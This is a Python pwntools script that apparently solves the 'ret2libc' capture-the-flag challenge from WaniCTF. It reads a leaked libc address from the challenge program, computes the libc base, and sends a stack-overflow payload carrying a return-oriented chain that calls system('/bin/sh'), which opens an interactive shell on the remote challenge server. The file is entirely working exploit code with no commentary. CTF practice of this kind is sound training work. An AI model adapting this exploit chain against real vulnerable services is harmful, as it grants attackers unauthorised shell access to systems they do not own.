#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("ret2libc-pwn.wanictf.org", 9007)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+231
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


p.recvuntil("+0x28 | ")
leak = eval(p.recv(18))
log.info("leak: " + hex(leak))
libc_base = leak - libc.symbols['__libc_start_main'] + 0x30
log.info("libc base: " + hex(libc_base))

rop_ret = 0x00401460
rop_pop_rdi = libc_base + 0x001bc021
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
system_libc_addr = libc_base + libc.symbols['system']

payload = b"A" * 0x8 * 5
payload += p64(rop_ret)
payload += p64(rop_pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_libc_addr)
payload += b"B" * 0x8 * 7

p.recvuntil(">")
p.sendline(payload)
p.sendline()

p.interactive()
